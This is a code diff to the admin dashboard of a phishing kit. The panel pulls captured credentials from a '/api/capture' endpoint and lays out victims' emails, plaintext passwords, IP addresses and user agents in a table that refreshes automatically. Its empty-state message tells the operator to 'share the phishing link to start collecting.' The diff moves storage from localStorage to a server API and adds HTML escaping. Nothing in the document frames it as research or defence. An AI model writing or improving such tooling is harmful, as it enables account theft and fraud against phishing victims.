@@ -87,14 +87,6 @@
             font-size: 13px;
         }
 
-        .badge {
-            background: #00d4ff20;
-            color: #00d4ff;
-            padding: 4px 8px;
-            border-radius: 6px;
-            font-size: 11px;
-        }
-
         .refresh-btn {
             background: linear-gradient(135deg, #00d4ff, #7b2cbf);
             border: none;
@@ -109,6 +101,12 @@
             text-align: center;
             padding: 60px;
             color: #8b8ca8;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #00d4ff;
         }
     </style>
 </head>
@@ -132,99 +130,81 @@
 
         <button class="refresh-btn" onclick="loadData()">⟳ Refresh Data</button>
 
-        <div id="tableContainer"></div>
+        <div id="tableContainer">
+            <div class="loading">Loading data...</div>
+        </div>
     </div>
 
     <script>
-        // Data disimpan di localStorage untuk admin panel
-        // Karena Vercel serverless tidak persistent, kita simpan di client
-        
-        let capturedData = [];
-
-        function loadData() {
-            const saved = localStorage.getItem('dilzx_captured');
-            if (saved) {
-                capturedData = JSON.parse(saved);
-            }
-            
-            updateDisplay();
-        }
-
-        function updateDisplay() {
-            const total = capturedData.length;
-            const today = capturedData.filter(d => {
-                const date = new Date(d.timestamp).toDateString();
-                return date === new Date().toDateString();
-            }).length;
-            
-            document.getElementById('totalCount').innerText = total;
-            document.getElementById('todayCount').innerText = today;
-            
+        async function loadData() {
             const container = document.getElementById('tableContainer');
+            container.innerHTML = '<div class="loading">Loading data...</div>';
             
-            if (capturedData.length === 0) {
-                container.innerHTML = `
-                    <div class="empty-state">
-                        📭 No captured credentials yet.<br>
-                        Share the phishing link to start collecting.
-                    </div>
-                `;
-                return;
-            }
-            
-            let html = `
-                <table>
-                    <thead>
-                        <tr><th>Time</th><th>Email</th><th>Password</th><th>User Agent</th><th>IP/Location</th></tr>
-                    </thead>
-                    <tbody>
-            `;
-            
-            capturedData.reverse().forEach(data => {
-                html += `
-                    <tr>
-                        <td>${new Date(data.timestamp).toLocaleString()}</td>
-                        <td><strong style="color:#00d4ff;">${data.email || '-'}</strong></td>
-                        <td>${data.password || '-'}</td>
-                        <td style="font-size:11px;">${(data.userAgent || '-').substring(0, 60)}...</td>
-                        <td>${data.platform || '-'}</td>
-                    </tr>
-                `;
-            });
-            
-            html += '</tbody></table>';
-            container.innerHTML = html;
-        }
-
-        // Listen for new data from capture API (via localStorage sync)
-        function checkForNewData() {
-            const saved = localStorage.getItem('dilzx_captured');
-            if (saved) {
-                const newData = JSON.parse(saved);
-                if (newData.length !== capturedData.length) {
-                    capturedData = newData;
-                    updateDisplay();
+            try {
+                const response = await fetch('/api/capture');
+                const data = await response.json();
+                
+                const capturedData = data.captured || [];
+                const total = capturedData.length;
+                const today = capturedData.filter(d => {
+                    const date = new Date(d.timestamp).toDateString();
+                    return date === new Date().toDateString();
+                }).length;
+                
+                document.getElementById('totalCount').innerText = total;
+                document.getElementById('todayCount').innerText = today;
+                
+                if (capturedData.length === 0) {
+                    container.innerHTML = `
+                        <div class="empty-state">
+                            📭 No captured credentials yet.<br>
+                            Share the phishing link to start collecting.<br><br>
+                            <strong>Test:</strong> Login ke halaman utama dulu.
+                        </div>
+                    `;
+                    return;
                 }
+                
+                let html = `
+                    <table>
+                        <thead>
+                            <tr><th>Time</th><th>Email</th><th>Password</th><th>IP</th><th>User Agent</th></tr>
+                        </thead>
+                        <tbody>
+                `;
+                
+                capturedData.forEach(data => {
+                    html += `
+                        <tr>
+                            <td>${new Date(data.timestamp).toLocaleString()}</td>
+                            <td><strong style="color:#00ff41;">${escapeHtml(data.email || '-')}</strong></td>
+                            <td><strong style="color:#ff9800;">${escapeHtml(data.password || '-')}</strong></td>
+                            <td>${data.ip || '-'}</td>
+                            <td style="font-size:11px;">${escapeHtml((data.userAgent || '-').substring(0, 60))}...</td>
+                        </tr>
+                    `;
+                });
+                
+                html += '</tbody></table>';
+                container.innerHTML = html;
+                
+            } catch (error) {
+                container.innerHTML = `<div class="empty-state">❌ Error loading data: ${error.message}</div>`;
             }
         }
         
-        // Simulate receiving data (in real scenario, capture API would save to localStorage)
-        // For demo, we'll add sample data
-        function addSampleData() {
-            const sample = {
-                email: 'test@example.com',
-                password: 'sample123',
-                timestamp: new Date().toISOString(),
-                userAgent: 'Mozilla/5.0 (Test)',
-                platform: 'Windows'
-            };
-            capturedData.unshift(sample);
-            localStorage.setItem('dilzx_captured', JSON.stringify(capturedData));
-            updateDisplay();
+        function escapeHtml(str) {
+            if (!str) return '';
+            return str.replace(/[&<>]/g, function(m) {
+                if (m === '&') return '&amp;';
+                if (m === '<') return '&lt;';
+                if (m === '>') return '&gt;';
+                return m;
+            });
         }
         
         loadData();
-        setInterval(checkForNewData, 3000);
+        setInterval(loadData, 5000);
     </script>
 </body>
 </html>
